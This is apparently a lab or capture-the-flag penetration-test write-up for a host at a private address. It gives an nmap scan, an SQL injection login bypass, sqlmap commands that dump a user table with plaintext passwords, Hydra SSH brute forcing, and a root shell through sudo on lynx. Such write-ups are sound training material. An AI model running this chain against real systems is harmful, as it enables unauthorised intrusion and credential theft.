üü¢ Executive Summary
Severity: High
Description:
Initial access was gained through a basic SQL Injection on the login page, which granted panel access. Using Burp Suite and sqlmap, a full dump of the database was extracted, including usernames and passwords. Valid SSH credentials were discovered, and access was obtained as the user nona. Privilege escalation was achieved through sudo permissions on the lynx binary, allowing shell escape to root and full system compromise.

üîç Finding Description

4.1 Port Scanning

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.132  
nmap -sCV -p<PORTS> 192.168.1.132  
Identified Port:

80/tcp ‚Äì Web application login interface

4.2 SQL Injection for Initial Access

Manual SQLi tested:

Username: ' OR 1=1-- -  
Password: ' OR 1=1-- -  
Successful login granted access to a chat panel. No sensitive information was directly visible, but the SQLi indicated possible further exploitation.

4.3 SQLMap for Database Dump

Captured login request with Burp Suite, saved as request.txt, and used with sqlmap:

sqlmap -r request.txt --dbs --batch  
sqlmap -r request.txt --dbs --batch -D chat --threads 10 --tables  
sqlmap -r request.txt --dbs --batch -D chat -T user --dump  
Extracted credentials from the chat.user table:

username	password
david	adrianthebest
jerry	thatsmynonapass
nona	myfriendtom
pao	pao
tina	davidwhatpass

4.4 SSH Brute Force with Extracted Credentials

Credential files created:
users.txt: david, jerry, nona, pao, tina
pass.txt: adrianthebest, thatsmynonapass, myfriendtom, pao, davidwhatpass

Hydra used to test:

hydra -L users.txt -P pass.txt ssh://192.168.1.132 -t 64 -I  

Successful access as user: nona
Password: thatsmynonapass

ssh nona@192.168.1.132  

4.5 Privilege Escalation via Lynx

Check sudo permissions:

sudo -l  
Result:

(ALL : ALL) NOPASSWD: /usr/bin/lynx
Executed lynx and escaped to shell using Shift + !:

sudo lynx  
[Shift + !]
whoami  
root  
Root shell obtained.
